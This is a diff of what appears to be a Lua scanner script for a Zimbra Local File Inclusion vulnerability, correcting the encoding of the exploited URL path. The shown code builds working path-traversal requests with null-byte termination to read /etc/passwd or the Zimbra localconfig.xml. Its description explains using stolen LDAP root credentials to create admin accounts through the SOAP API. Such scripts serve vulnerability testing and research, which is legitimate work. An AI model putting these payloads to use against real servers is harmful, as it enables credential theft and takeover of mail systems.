@@ -66,7 +66,7 @@ action = function(host, port)
        state = vulns.STATE.NOT_VULN, -- default
        description = [[
 This script exploits a Local File Inclusion in
-/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx20TemplateMsg.js.zgz
+/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz
 which allows us to see any file on the filesystem, including config files
 that contain LDAP root credentials, allowing us to make requests in
 /service/admin/soap API with the stolen LDAP credentials to create user
@@ -87,8 +87,8 @@ This issue was patched in Zimbra 7.2.6.
   local file_long = "../../../../../../../../../etc/passwd"
   --local file_long = "../../../../../../../../../opt/zimbra/conf/localconfig.xml"
 
-  local url_short = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_short .. "%00"
-  local url_long = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_long .. "%00"
+  local url_short = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_short .. "%00"
+  local url_long = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=" .. file_long .. "%00"
 
   stdnse.print_debug(1, "Trying to detect if the server is vulnerable")
   stdnse.print_debug(1, "GET " .. uri .. escape(url_short))
